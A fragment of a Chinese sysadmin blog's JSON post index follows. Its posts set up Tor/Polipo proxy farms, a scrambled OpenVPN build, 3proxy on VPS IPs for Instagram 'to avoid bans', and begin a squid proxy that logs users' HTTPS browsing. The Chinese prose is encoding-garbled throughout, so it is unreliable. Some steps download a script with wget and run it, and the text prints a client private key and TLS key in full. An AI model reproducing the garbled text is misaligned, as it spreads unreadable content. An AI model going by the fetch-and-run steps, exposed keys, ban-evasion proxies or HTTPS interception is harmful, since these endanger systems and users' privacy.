·å°±æ¯”è¾ƒå…¨äº†ï¼Œæœ¬æœºIP/å¤–æ¥IPï¼Œå¦‚æœå‰é¢æ˜¯nginxä»£ç†çš„ï¼Œipå’Œå†…å®¹ä»¥åŠuser-agentéƒ½èƒ½è®°å½•ä¸‹æ¥ï¼Œä»¥ä¾¿ä¹‹åæŸ¥æ‰¾å’Œå¤„ç†ã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-tomcat_log_format/","series":null,"tags":null,"title":"Tomcatæ¨èçš„æ—¥å¿—è®°å½•æ ¼å¼"},{"categories":null,"content":"Freelancerä¸Šæœ‰ä¸ªproxy setupçš„ä»»åŠ¡ï¼š\n1Project Description 2Hi, I would like to create a new VPS proxy server with multiple IPs on the same VPS. 3Are you able to that? 4What OS do you prefer? 5- I have 10 ips. 6- I want them to be as much anonymous as you can. 7- I would have an Username and Password as auth, but if needed the possibility to have an IP authentication too. 8My budget is: ~20$ 9Thank you in advance. è¯´è€å®è¯ï¼Œ10ä¸ªIPæ²¡å¿…è¦ï¼Œä¸€ä¸ªIPè¶³å¤Ÿäº†ï¼Œç”¨Tor+polipoå³å¯ã€‚\nTorçš„éƒ¨åˆ†ï¼Œç”¨å®Œå…¨å‘½ä»¤è¡ŒåŠ å‚æ•°å¯åŠ¨ï¼š\n1$ mkdir -p /tmp/tor10001/data 2$ /usr/bin/tor SOCKSPort 10001 CONTROLPort 20001 DATADirectory /tmp/tor10001/data Polipoçš„éƒ¨åˆ†ï¼Œä¹Ÿå®Œå…¨ç”¨å‘½ä»¤è¡Œå¯åŠ¨ï¼š\n1$ polipo socksParentProxy=\u0026#34;127.0.0.1:10001\u0026#34; proxyPort=30001 proxyAddress=\u0026#34;0.0.0.0\u0026#34; authCredentials=\u0026#34;username:password\u0026#34; ç»„åˆèµ·æ¥ï¼Œå¼„æˆä¸€ä¸ªè„šæœ¬ï¼š\n1$ mkdir -p /tmp/tor10002/data 2$ nohup /usr/bin/tor SOCKSPort 10002 CONTROLPort 20002 DATADirectory /tmp/tor10002/data \u0026amp; 3$ nohup polipo socksParentProxy=\u0026#34;127.0.0.1:10002\u0026#34; proxyPort=30002 proxyAddress=\u0026#34;0.0.0.0\u0026#34; authCredentials=\u0026#34;username:password\u0026#34; \u0026amp; å¼€100ä¸ªTor+Polipoï¼š\n1#!/bin/bash 2 3a=10001 4b=20001 5c=30001 6n=10100 7 8echo \u0026#34;Start multiple Tors+polipo\u0026#34; 9echo \u0026#34;Begin port \u0026#34; $a 10echo \u0026#34;End port \u0026#34; $n 11 12while [ $a -le $n ] 13do 14 echo \u0026#34;Start Tor on port\u0026#34; $a 15 mkdir -p /tmp/tor$a/data 16 nohup /usr/bin/tor SOCKSPort $a CONTROLPort $b DATADirectory /tmp/tor$a/data \u0026amp; 17 echo \u0026#34;Start Polipo on port\u0026#34; $c 18 nohup polipo socksParentProxy=\u0026#34;127.0.0.1:$a\u0026#34; proxyPort=$c proxyAddress=\u0026#34;0.0.0.0\u0026#34; authCredentials=\u0026#34;username:password\u0026#34; \u0026amp; 19 20 a=$(($a + 1)) 21 b=$(($b + 1)) 22 c=$(($c + 1)) 23done é€šæ€Tor+Polipoçš„è„šæœ¬\n1#!/bin/bash 2ps aux | grep tor | awk \u0026#39;{print $2}\u0026#39; | xargs kill -9 3ps aux | grep polipo | awk \u0026#39;{print $2}\u0026#39; | xargs kill -9 ","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-freelancer_1/","series":null,"tags":null,"title":"Freelancerçš„ä»»åŠ¡ä¹‹ä¸€ï¼šå¤šIPå¤šé‡åŒ¿åä»£ç†åŠ è®¤è¯"},{"categories":null,"content":"è¿™ä¸ªå¾ˆå¥‡æ€ªæ’’ï¼Œä»”ç»†æŸ¥äº†ä¸‹ï¼ŒåŸä½œè€…æ˜¯è¿™ä¹ˆè¯´çš„ï¼š\n1I have created a patch which introduces some forms of scrambling to the packet payload of any OpenVPN connection. 2I have been successfully using the patch with Iranian and Chinese users for some time now. çœ‹æ¥ä¼Šæœ—ä¹Ÿæ¯”è¾ƒç³Ÿç³•å•Šã€‚\næ— è¯­ï¼Œé‰´äºåœ¨æ£®åæ˜“è…¾æ— æ³•å»ºopenvpnï¼Œä¸çŸ¥é“æ˜¯ç›´æ¥å°äº†1194çš„udpç«¯å£ï¼Œè¿˜æ˜¯ä»åè®®ä¸Šå°æ‰äº†openvpnï¼Œæ€»ä¹‹ï¼Œéƒ½å¾ˆshitã€‚\nç®€å•è¯´å°±æ˜¯å¯¹openvpnåè®®è¿›è¡Œäº†æ··æ·†ï¼Œå¤šäº†ä¸€ä¸ªé…ç½®é¡¹ï¼š\n1scramble å‚æ•° 2scramble reverse #å¯¹ä¼ è¾“çš„æ•°æ®è¿›è¡Œåè½¬ï¼Œé€šå¸¸è¿™ä¸€å¥å°±å·²ç»å¯ä»¥ç»•è¿‡Chinaå’ŒIrançš„æ£€æµ‹æœºåˆ¶äº† 3scramble xorptrpos #å¯¹ä¼ è¾“çš„packageä¸­çš„æœ‰æ•ˆæ•°æ®è¿›è¡Œxorè¿ç®— 4scramble obfuscate password #æ›´å¼ºçƒˆçš„åŠ å¯†ã€‚åè½¬+xor+å¯†ç ä¸‰ç§æ–¹å¼å…¨ç”¨ä¸Š. \u0026#34;password\u0026#34; æ˜¯ä½ è®¾å®šçš„å¯†ç  5 6ç”¨ä¸Šè¿™ä¸ªé…ç½®é¡¹åï¼Œå»ºè®®è®¾ç½®cipher none, å› ä¸ºå¦‚æ­¤è¿™èˆ¬ä»¥åï¼Œæ²¡æœ‰å¿…è¦å†åˆ¶å®šcipheræ–¹å¼äº†ã€‚å¦å¤–ï¼Œç”¨cipherä¼šæ¶ˆè€—cpuï¼Œè€Œé‡‡ç”¨scrambleæ¶ˆè€—cpuçš„ç¨‹åº¦æ¯”cipherä½ã€‚ æ­ä¸€ä¸ªè¯•è¯•çœ‹ è¿™é‡Œé‡‡ç”¨çš„æ˜¯openvpn 2.4.4ç‰ˆæœ¬å’Œç›¸åº”çš„patch\nä¸‹è½½ï¼š\n2.4.4.zip master.zip 1#centos 2yum -y install unzip 3yum -y groupinstall \u0026#34;development tools\u0026#34; 4 5#ubuntu 6apt update 7apt install build-essential 8 9unzip -x 2.4.4.zip 10unzip -x master.zip åº”ç”¨è¡¥ä¸ï¼š\n1cd openvpn-release-2.4/ 2git apply ../openvpn_xorpatch-master/openvpn_xor.patch å®‰è£…ä¾èµ–åŒ…å¹¶ç¼–è¯‘ï¼š\n1#cetnos 2yum install -y openssl-devel lz4-devel net-tools lzo-devel pam-devel 3 4#ubuntu 5apt install autoreconf liblzo2-dev libpam0g-dev 6 7autoreconf -i -v -f 8./configure --prefix=/export/servers/openvpn 9 10make 11make install å®‰è£…easy-rsa-3.0ï¼Œä¸å¾—ä¸å‡»èŠ‚å«å¥½å•Šï¼Œeasy-rsa 3.0æ¯”2.0è¿›åŒ–å¤šäº†ï¼Œå°±ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿè½»çœå¤šäº†ï¼š\n1wget http://img.rendoumi.com/soft/vpn/easy-rsa.zip 2unzip -x easy-rsa.zip å»ºç«‹openvpné…ç½®æ–‡ä»¶å¤¹\n1mkdir -p /etc/openvpn/conf 2cp -r easy-rsa-master/easyrsa3/* /etc/openvpn çœ‹çœ‹æ–°ç‰ˆeasy-rsa-3.0éƒ½æœ‰ä»€ä¹ˆå‘½ä»¤\n1cd /etc/openvpn 2./easyrsa 3 4Easy-RSA 3 usage and overview 5 6USAGE: easyrsa [options] COMMAND [command-options] 7 8A list of commands is shown below. To get detailed usage and help for a 9command, run: 10 ./easyrsa help COMMAND 11 12For a listing of options that can be supplied before the command, use: 13 ./easyrsa help options 14 15Here is the list of commands available with a short syntax reminder. Use the 16\u0026#39;help\u0026#39; command above to get full usage details. 17 18 init-pki 19 build-ca [ cmd-opts ] 20 gen-dh 21 gen-req \u0026lt;filename_base\u0026gt; [ cmd-opts ] 22 sign-req \u0026lt;type\u0026gt; \u0026lt;filename_base\u0026gt; 23 build-client-full \u0026lt;filename_base\u0026gt; [ cmd-opts ] 24 build-server-full \u0026lt;filename_base\u0026gt; [ cmd-opts ] 25 revoke \u0026lt;filename_base\u0026gt; 26 gen-crl 27 update-db 28 show-req \u0026lt;filename_base\u0026gt; [ cmd-opts ] 29 show-cert \u0026lt;filename_base\u0026gt; [ cmd-opts ] 30 import-req \u0026lt;request_file_path\u0026gt; \u0026lt;short_basename\u0026gt; 31 export-p7 \u0026lt;filename_base\u0026gt; [ cmd-opts ] 32 export-p12 \u0026lt;filename_base\u0026gt; [ cmd-opts ] 33 set-rsa-pass \u0026lt;filename_base\u0026gt; [ cmd-opts ] 34 set-ec-pass \u0026lt;filename_base\u0026gt; [ cmd-opts ] 35 36DIRECTORY STATUS (commands would take effect on these locations) 37 EASYRSA: . 38 PKI: /etc/openvpn/pki ç®€å•æ˜äº†ï¼Œä¸€ç›®äº†ç„¶ï¼Œæ¥å§ï¼Œä¸€æ°”å‘µæˆ\n1cd /etc/openvpn 2./easyrsa init-pki 3./easyrsa --batch build-ca nopass 4./easyrsa --batch build-server-full server nopass 5./easyrsa --batch build-client-full client1 nopass 6./easyrsa gen-dh ä»€ä¹ˆéƒ½ä¸ç”¨ç®¡ï¼Œå°±å…¨å¼„å¥½äº†ï¼Œæ¯”èµ·easy-rsa 2.0ä¸€å †è„šæœ¬ï¼Œä¿®æ”¹varsï¼Œçœäº‹å¤šäº†ï¼ï¼ï¼\nå‡†å¤‡serverç«¯çš„é…ç½®æ–‡ä»¶ï¼š\n1cd /etc/openvpn/ 2cp pki/ca.crt pki/dh.pem pki/private/client1.key pki/private/server.key pki/issued/* /etc/openvpn/conf 3cd /etc/openvpn/conf 4/export/servers/openvpn/sbin/openvpn --genkey --secret ta.key è¿™æ ·/etc/openvpn/confä¸‹å°±ä¼šæœ‰7ä¸ªæ–‡ä»¶\n1ca.crt 2server.key 3client1.key 4client1.crt 5dh.pem 6server.crt 7ta.key å‡†å¤‡ä¸ªæ¨¡æ¿ï¼š\n1cat\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/openvpn/conf/server.conf 2port 1194 3proto udp 4dev tun 5 6server 10.8.0.0 255.255.255.0 7 8scramble obfuscate fuckfuckfuck 9 10ca /etc/openvpn/conf/ca.crt 11cert /etc/openvpn/conf/server.crt 12key /etc/openvpn/conf/server.key 13tls-auth /etc/openvpn/conf/ta.key 0 14key-direction 0 15dh /etc/openvpn/conf/dh.pem 16cipher none 17 18#push \u0026#34;route 172.16.0.0 255.255.0.0\u0026#34; 19 20client-to-client 21comp-lzo 22 23persist-key 24persist-tun 25 26user nobody 27group nobody 28 29ifconfig-pool-persist /etc/openvpn/conf/ipp.txt 30status /var/log/openvpn-status.log 31log /var/log/openvpn.log 32log-append /var/log/openvpn.log 33 34keepalive 5 30 35 36verb 3 37EOF å¯åŠ¨serverç«¯\n1/export/servers/openvpn/sbin/openvpn --config /etc/openvpn/server.conf --daemon å‡†å¤‡å®¢æˆ·ç«¯æ–‡ä»¶\n1cat\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/openvpn/conf/client1.ovpn 2client 3dev tun 4proto udp 5remote change_this_to_server_address 1194 6scramble obfuscate fuckfuckfuck 7resolv-retry infinite 8nobind 9persist-key 10persist-tun 11user nobody 12group nogroup 13ca ca.crt 14cert client1.crt 15key client1.key 16tls-auth ta.key 1 17remote-cert-tls server 18key-direction 1 19cipher none 20comp-lzo 21keepalive 5 30 22verb 3 23EOF åˆå¹¶å‡ºä¸€ä¸ªå•ç‹¬çš„å®¢æˆ·ç«¯æ–‡ä»¶ æ³¨æ„merge.shé‡Œé¢æ–‡ä»¶çš„é…ç½®ï¼š\n1ca=\u0026#34;ca.crt\u0026#34; 2cert=\u0026#34;client1.crt\u0026#34; 3key=\u0026#34;client1.key\u0026#34; 4tlsauth=\u0026#34;ta.key\u0026#34; 5ovpndest=\u0026#34;client1.ovpn\u0026#34; 6cd /etc/openvpn/conf 7wget http://img.rendoumi.com/soft/vpn/merge.sh 8chmod 755 merge.sh 9./merge.sh è¿™æ ·å°±ä¼šåˆå¹¶å‡ºä¸€ä¸ªclient1.ovpnå®¢æˆ·ç«¯è¿æ¥æ–‡ä»¶æ¥ï¼Œå…¨éƒ¨åˆä¸€ï¼Œå…¶å®server.confä¹Ÿå¯ä»¥æŠŠæ‰€æœ‰ä¸œè¥¿åŒ…æ‹¬è¿›å»\n1client 2dev tun 3proto udp 4remote change_this_to_server_address 1194 5scramble obfuscate fuckfuckfuck 6resolv-retry infinite 7nobind 8persist-key 9persist-tun 10remote-cert-tls server 11cipher none 12comp-lzo 13verb 3 14key-direction 1 15\u0026lt;ca\u0026gt; 16-----BEGIN CERTIFICATE----- 17MIIDKzCCAhOgAwIBAgIJAOG5arbs5t9RMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV 18BAMTCENoYW5nZU1lMB4XDTE4MDMyODAzNDkyMloXDTI4MDMyNTAzNDkyMlowEzER 19MA8GA1UEAxMIQ2hhbmdlTWUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB 20AQDMOUuQg49OstGbfPLjTgzwb5YBmBeVxyF3+5jmKbgPXujZ3dvdBwxaslVUwre6 21XsMUBz3vbB7Kf1BBDHe2jt60p2x2O+ptTb3rRhTPLhdhd9C3HUhwkNYc7jv1+ua3 22sUlwiYikltKhXGVU3e/XYB+Aiw63mem4ex5T4kJ/KIKoulGhUsaOl9JtPPKbeIlV 23BgUzBLHNt/9bY7r7m2Fh0VmbD5p5YMZEGrg+WX0qzT4wKD/734VdxuAoFwd7as6s 24CH73w0ykscV7evUJEaNu1keTqgqG5SuE3HzQ1cmWSSeF84gUes+l2JAivpQ/XTkF 25wdLnq2caXVTMDF8t/Y1e8JfVAgMBAAGjgYEwfzAdBgNVHQ4EFgQU+SKBqluAW6hQ 26p8y9Q22ZBhkTw5IwQwYDVR0jBDwwOoAU+SKBqluAW6hQp8y9Q22ZBhkTw5KhF6QV 27MBMxETAPBgNVBAMTCENoYW5nZU1lggkA4blqtuzm31EwDAYDVR0TBAUwAwEB/zAL 28BgNVHQ8EBAMCAQYwDQYJKoZIhvcNAQELBQADggEBAL9ZqyMSrrJ2ss/5pQhUBw71 29nmjeT8DPg7Optiq02oAPdIo06WdJ77Y+mFypGKw8uUHp/h0mL5wBr6NBYbdw+5Lc 30vv4tCpOzzNW7PJngJWilIdvL1W+y3i3/AolSs7jAradaOQOpI23tOeQAQUmwchmt 31hvgKH8kyIWlOzxGIHdG9Spv8Oi1X6dwD0t4ddaNqcnCbyC2cBX4TvlXeVixMdBLY 32xq/5+G6dlJhaUzD4lG9Co7PTctwOFzKIP+mCrhLFCh7v5L6HCqL5ZLI7bWYTy0rm 33XURbleynyld95FKuul5YFRyb/j+I8iBd3Sw9TWhVuqKb4JX9n6zB1FxkNUX1r4g= 34-----END CERTIFICATE----- 35\u0026lt;/ca\u0026gt; 36\u0026lt;cert\u0026gt; 37-----BEGIN CERTIFICATE----- 38MIIDRTCCAi2gAwIBAgIRALV3i3gqfdbfWujom75JgiwwDQYJKoZIhvcNAQELBQAw 39EzERMA8GA1UEAxMIQ2hhbmdlTWUwHhcNMTgwMzI4MDg1NjQ5WhcNMjgwMzI1MDg1 40NjQ5WjASMRAwDgYDVQQDEwdjbGllbnQxMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A 41MIIBCgKCAQEAqXq+oaXFyp24OBuXrAPRxnyg4t7eKl7jh4EmL+T2xnQ5qZfwDBz/ 420mI6MDgqPFDC8DWeO3iJZlNlIBNrHpza2kj53Fw7UB1yyi9fArt3Luj2HdjqXyDw 43yLTX6dVV/m+dP7Jq1OnnpaG7gbkjKaaS8inc79v1ismJK9ZAwaiQobv1T3Th7eL+ 44nrKfjCJ/gevHfXocR7PuEe1CwyUEp124Z5fhq7S6JAgmt3WbiBVPIg5lp/pCyfbh 45K6z1Y5abPVCAJXTqgbaYBLIorO88wn5zn5D6ZFXDTdo3gJgQSlbax6AN5CqyK+Qi 46U2mF7Cf8+Ma+0eLbOFM62kulaqXX+uUojwIDAQABo4GUMIGRMAkGA1UdEwQCMAAw 47HQYDVR0OBBYEFJaAOw/CP8O/dnncm/VwlPow8kM9MEMGA1UdIwQ8MDqAFPkigapb 48gFuoUKfMvUNtmQYZE8OSoRekFTATMREwDwYDVQQDEwhDaGFuZ2VNZYIJAOG5arbs 495t9RMBMGA1UdJQQMMAoGCCsGAQUFBwMCMAsGA1UdDwQEAwIHgDANBgkqhkiG9w0B 50AQsFAAOCAQEAmU9Y+dP4PH0eh4KMNW0QhseN0t0CK1Nzyu3hNcuIntns3J3VpJ1u 511WKA16mnH8nLu2hNUKnWkOnuvPnwXIprWdg9Zvmct/QEtys4THnG3+5Ni7wVexhU 52lNU0qZcwGNwqQiZBrHcZZq6pAKtrAH0kD6/l5qCeScPrDIy6w3eFfGa/AJcEBNEN 53Wruj3hUQxRsv35XFfxEROaklfuLrfr0U1OlWDySSGMQafXjZCmLdxRb5IkI90255 54t3yksT9Bj7v/2n++ttlQTH0FK5zY7Uz76A21idiRCw/aVeXvJkafYqi+o/9kkVJh 55w+Q9Lm+AKGkaaMgz0dt0cmVZgHsnyzOzhQ== 56-----END CERTIFICATE----- 57\u0026lt;/cert\u0026gt; 58\u0026lt;key\u0026gt; 59-----BEGIN PRIVATE KEY----- 60MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCper6hpcXKnbg4 61G5esA9HGfKDi3t4qXuOHgSYv5PbGdDmpl/AMHP/SYjowOCo8UMLwNZ47eIlmU2Ug 62E2senNraSPncXDtQHXLKL18Cu3cu6PYd2OpfIPDItNfp1VX+b50/smrU6eelobuB 63uSMpppLyKdzv2/WKyYkr1kDBqJChu/VPdOHt4v6esp+MIn+B68d9ehxHs+4R7ULD 64JQSnXbhnl+GrtLokCCa3dZuIFU8iDmWn+kLJ9uErrPVjlps9UIAldOqBtpgEsiis 657zzCfnOfkPpkVcNN2jeAmBBKVtrHoA3kKrIr5CJTaYXsJ/z4xr7R4ts4UzraS6Vq 66pdf65SiPAgMBAAECggEAKwlSUzYHTfZTC1xmXXXy1RZcvH+fpt7FpGk1S0A3Mhnd 67cqV0fX73r3LmF8yLXRmdBuZ2sd9f9K4EpeqIbxOht4CEgmKhZSy1M4Zn+AemsjDS 68Hq4whcuVmUHi+iwEVEH/imdCHaLwAe1Z8g0TUsZL1lavFfGjHoUi4hDcDNFDOO5Z 69+gOL+ZLtAwCibcdTgdW7xXZMY6U4Mg4f7VggFqpuxe90ebaa1DHUYOm4XFQdrEOg 70KtC93wkFKuz9fXvyCyjk5t3oXO3EQvLSsm0W1LhBYkdZp8fUmkgh7Lz2J/h7/qK9 71FYxbkvbFE7Zl1FE0g4kYNgMRq94Dy7IPhrbCXh1XUQKBgQDXYJt0KlfNdIQrZVsg 72kGkvE9eeEw3XhRCzsKIqnD3DkvkgowD6kpq9rU3tTg1x830QbfPu9L5cQEt5Hlsg 73zzCWKsjvC8Gnblz4ctvUvl+o9jbIKBf1aSykGGLZqB8rITd+gY8jcRDE637pxmKO 74HHhN0hjXyhSpjSCeWfvHHt4OdQKBgQDJcfq3nVmO6JBjn8Csywi9OHhodI4IKcLH 75EuEoJR0akv5l07UQGZXjkT60UUg5uAIU+z/Bk7UOErJckxvMCLzg9/O1ZRCEppdP 76GKMP4DM/xxdf37zEifBtFzBG9LCoIEJqRwzhaD7jyEg8jEv9G+ege/Bp5W9WDS2P 779bWWF3DCcwKBgHN+0t4QdtUuTlIXIC7uQfmE4nNaNGoGaVZyugOvlU9zWTUvNC8q 78vuBINymyWXNp5v8Qd2cEx7Agqlhg9u05LgzZFLdbzpVCkYiJz2jeTd4FaosbNP3d 79UJsOmLOvfEdcoK2uPFv9Hcj7oCssv10F112j9L6DF2F01LEV//ZfjyShAoGAEHjo 80hoEwZJYx0GOszrRfh5GJjwkQ4CwCCGNL1AuM4LJqaQsxwBpHfm9PEFGhNU8NpIeT 81BBI++OKggR9qY3nHcCH2ZLvZ6O7yan5aPx8XMbzm9WkHN48MAO+ne/XgSC8zHxum 82OvxaQCgNeB4EzLKucxoPY6lmPEQhmKb/7UEHcG8CgYEAxhtREMFAL0+uDAJ72WLx 83qCEM0x9zet5DOLOqxUSlBJILAwwcgGA1DXdjMej/BxZbIHgZANZ3Gj+k3D5m4GQl 84Pe3DtI3HBLbVH8DeyZC6fJxjaNi16/mbD6puRpPs+w0D2pQwJr6k2uR8+G883RW5 854vcpovBkutR5n1M09M3DyeU= 86-----END PRIVATE KEY----- 87\u0026lt;/key\u0026gt; 88\u0026lt;tls-auth\u0026gt; 89-----BEGIN OpenVPN Static key V1----- 9079a3add18ba52b97045de864939a9a9e 91a0a07657bce8a0210c41b7d83d48ec48 9281c89db3dbec8b4bfc13424d3813711d 93f34a4770ebeaf181eeffcd3f38cea425 9478006c5b7506a5d9dcb0079daa3b3412 955434af9df560f3a0d29bc8b333479943 960f5839fee349f2079d03c9d31d6e2bf4 9726a32180c8e4f6c1579acbfef7596335 98a4147c64395ff77927ebe02f2a757d17 99a2df3245670c1eff89f9e1025dbc4b07 1008d3fcfaf4fbad44d9becf17f5d6d34ee 10150d616fb58bc0e29da54a934353701a9 102973df9b1f9041706642ff8ed00b24462 1035cb52768dd5472093855d0e8fa5b8762 104cca2aa48bda3d8964a19842fbf9d2081 105ff0075295379f663129723ee9319a789 106-----END OpenVPN Static key V1----- 107\u0026lt;/tls-auth\u0026gt; okï¼ŒæŠŠè¿™ä¸ªclient1.ovpnæ‹·è´å‡ºæ¥ï¼Œå‡†å¤‡å¼„åˆ°windowsä¸Šç”¨\nåœ¨windowsä¸Šä¸‹è½½åŸå§‹çš„openvpn-gui:\n1http://img.rendoumi.com/soft/vpn/openvpn-install-2.4.4-I601.exe ç„¶åä¸‹è½½å¯¹åº”çš„openvpnä¸»æ–‡ä»¶\n1 https://github.com/lawtancool/openvpn-windows-xor/releases å…ˆå®‰è£…å¥½openvpnï¼Œç„¶ååˆ°\n1C:\\Program Files\\OpenVPN\\config æŠŠclient1.ovpnæ”¾è¿›å»\nç„¶åä»¥ç®¡ç†å‘˜èº«ä»½å¯åŠ¨æ¡Œé¢ä¸Šçš„OpenVPN-GUIï¼Œå³é”®ç‚¹å‡»è¿æ¥å°±å¯ä»¥è¿ä¸Šäº†ã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124_freelancer_2/","series":null,"tags":null,"title":"Freelancerä»»åŠ¡ä¹‹äºŒï¼šå»ºä¸€ä¸ªscramble Obfuscated Opevpn"},{"categories":null,"content":"ä»»åŠ¡çš„è¦æ±‚æ˜¯ï¼š\nâ€¢ Multiple subnets to avoid bans â€¢I need the proxies to have the ability of User:Pass â€¢Proxy needs to be Residential IPv6\nè¿˜ç»™å‡ºäº†ä¸€ä¸ªå‚è€ƒï¼š https://www.blackhatworld.com/seo/never-buy-proxies-again-setup-your-own-proxy-server.872539/ æ©ï¼Œæ¯”è¾ƒæœ‰æ„æ€ã€‚æŒ‰ç…§ä»–ç»™çš„è¿æ¥ï¼š\nç¬¬ä¸€æ­¥å» LowEndBox.com æˆ–è€… Webhostingtalk.com å»æ‰¾ä¸€å®¶å£ç¢‘æ¯”è¾ƒå¥½ï¼Œè€Œä¸”èƒ½æä¾›é™„åŠ ipçš„VPSä¾›åº”å•†ï¼Œé€šå¸¸é™„åŠ ä¸€ä¸ªIPæ˜¯1$ä¸€ä¸ªæœˆã€‚\nç¬¬äºŒæ­¥ä¹°ä¸ªVPSï¼Œé…ç½®æ˜¯1Gå†…å­˜ï¼Œ1ä¸ªå†…æ ¸ï¼Œ100Må¸¦å®½ï¼Œå¹¶ä¸”é™„åŠ 10ä¸ªIPã€‚\nè¿™æ ·çš„VPSä¸€èˆ¬æ˜¯5$ä¸€ä¸ªæœˆï¼Œ10$10ä¸ªipä¸€ä¸ªæœˆï¼Œåˆè®¡15$ä¸€ä¸ªæœˆï¼Œ100å…ƒäººæ°‘å¸ï¼Œè¿™æ ·ä½ å°±æœ‰11ä¸ªIPå¯ç”¨äº†ã€‚\næŒ‰è¿™ä¸ªä»»åŠ¡çš„è¦æ±‚ï¼Œéœ€è¦Multiple subnetï¼Œä½ å°±ä»è¿™å®¶ä¾›åº”å•†çš„ä¸åŒåœ°ç‚¹å¤šä¹°å‡ å°ï¼Œæ¯”å¦‚æ´›æ‰çŸ¶1å°ï¼Œå¾·å·1å°ï¼Œçº½çº¦1å°ï¼Œç„¶åæ¯å°é™„åŠ 10ä¸ªIP\nç¬¬ä¸‰æ­¥å°±æ˜¯å®‰è£…Proxyè½¯ä»¶äº†ï¼š\nä¸‹è½½3Proxy\n1wget http://img.rendoumi.com/soft/3proxy/0.8.11.tar.gz 2tar zxvf 0.8.11.tar.gz ç¼–è¯‘å®‰è£…ï¼š\n1cd 3proxy-0.8.11 2sed -i \u0026#39;s/^prefix.*/prefix=\\/usr\\/local\\/3proxy/\u0026#39; Makefile.Linux 3sed -i \u0026#39;/DENY.*/a #define ANONYMOUS 1\u0026#39; src/proxy.h 4make -f Makefile.Linux 5make -f Makefile.Linux install æ³¨æ„ä¸Šé¢æˆ‘æ˜¯å®‰è£…åˆ°äº†/usr/local/3proxyï¼Œå¤§å®¶å¯ä»¥æ ¹æ®éœ€æ±‚ä¿®æ”¹ã€‚\nçœ‹çœ‹é…ç½®éƒ½æ˜¯ä»€ä¹ˆ\n1cat cfg/3proxy.cfg.sample |grep -v ^# | grep -v ^$ 2nserver 10.1.2.1 3nserver 10.2.2.2 4nscache 65536 5timeouts 1 5 30 60 180 1800 15 60 6users 3APA3A:CL:3apa3a \u0026#34;test:CR:$1$qwer$CHFTUFGqkjue9HyhcMHEe1\u0026#34; 7service 8log c:\\3proxy\\logs\\3proxy.log D 9logformat \u0026#34;- +_L%t.%. %N.%p %E %U %C:%c %R:%r %O %I %h %T\u0026#34; 10archiver rar rar a -df -inul %A %F 11rotate 30 12auth iponly 13external 10.1.1.1 14internal 192.168.1.1 15auth none 16dnspr 17auth strong 18deny * * 127.0.0.1,192.168.1.1 19allow * * * 80-88,8080-8088 HTTP 20allow * * * 443,8443 HTTPS 21proxy -n 22auth none 23pop3p 24tcppm 25 mail.my.provider 25 25auth strong 26flush 27allow 3APA3A,test 28maxconn 20 29socks 30auth strong 31flush 32internal 127.0.0.1 33allow 3APA3A 127.0.0.1 34maxconn 3 35admin ä¸€å †çš„åºŸç‰©é…ç½®å•Šï¼Œç»Ÿç»Ÿå»æ‰\n1cat\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/usr/local/3proxy/bin/3proxy.conf 2daemon 3timeouts 1 5 30 60 180 1800 15 60 4log /var/log/3proxy.log D 5logformat \u0026#34;- +_L%t.%. %N.%p %E %U %C:%c %R:%r %O %I %h %T\u0026#34; 6rotate 30 7 8users user:CL:pass 9 10auth strong 11allow user 12proxy -p3128 -a -i172.16.8.1 -e172.16.8.1 13flush 14EOF æœ‰ç”¨çš„å°±æ˜¯ä¸‹é¢5è¡Œ users å®šä¹‰äº†ä¸€ä¸ªç”¨æˆ·user,æ˜æ–‡å¯†ç ï¼Œå¯†ç æ˜¯pass auth å®šä¹‰äº†éœ€è¦è®¤è¯ allow å®šä¹‰äº†userç”¨æˆ·å¯ä»¥è®¿é—® proxy -pç«¯å£ -a -iå†…ç½‘ç›‘å¬ip -eå‡ºå£ip\nokäº†ï¼Œç„¶åå¯åŠ¨ï¼š\n1cd /usr/local/3proxy/bin 2./3proxy 3proxy.conf æµ‹è¯•ä¸€ä¸‹ï¼š\n1curl --proxy 172.16.8.1:3128 --proxy-user user:pass http://www.sina.com.cn -vvv|more è¿˜æœ‰ä¸ªéœ€æ±‚ï¼Œipv6\n1æ ¼å¼å¦‚ä¸‹ 2proxy -6 -n -a -p\u0026lt;PORT1\u0026gt; -i\u0026lt;IPv4\u0026gt; -e\u0026lt;IPv6\u0026gt; 3proxy -6 -n -a -p\u0026lt;PORT2\u0026gt; -i\u0026lt;IPv4\u0026gt; -e\u0026lt;IPv6\u0026gt; 4... 5è¿™ä¹ˆæä¸€ä¸‹å³å¯ï¼š 6proxy -6 -n -a -p3128 -i172.16.8.1 -e2a02:26f0:4000:17d::2adb okï¼Œæå®šã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124_freelancer_3/","series":null,"tags":null,"title":"Freelancerä»»åŠ¡ä¹‹ä¸‰ï¼šSetup Proxy on VPS for Instagram"},{"categories":null,"content":"è¿™ä¸ªéœ€æ±‚ä¹Ÿæ¯”è¾ƒç®€å•ï¼š\nUser Browsing Log for Open VPN server\nç®€å•è¯´å°±æ˜¯ç”¨æˆ·è¿åˆ°ä»–çš„openvpnæœåŠ¡å™¨ï¼Œé€šè¿‡ä¸Šé¢çš„squidä»£ç†æ¥æµè§ˆå…¶ä»–ç½‘ç«™ï¼Œæ¯”è¾ƒç‰¹åˆ«çš„æ˜¯éœ€è¦æŸ¥çœ‹ç”¨æˆ·httpå’Œhttpsçš„æµè§ˆè®°å½•ã€‚\nsquidåšé€æ˜ä»£ç†ï¼Œè¿™æ ·å°±å¯ä»¥æˆªå–æµè§ˆè®°å½•å¹¶ä¸”æä¾›åŠ é€Ÿäº†\næœåŠ¡å™¨æ˜¯Ubuntuï¼Œç¼ºçœå®‰è£…çš„çš„squidæ˜¯ä¸æ”¯æŒSSLçš„ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°ç¼–è¯‘ä¸€ä¸ª\nå®‰è£…ä¾èµ–åŒ…ï¼š\n1sudo 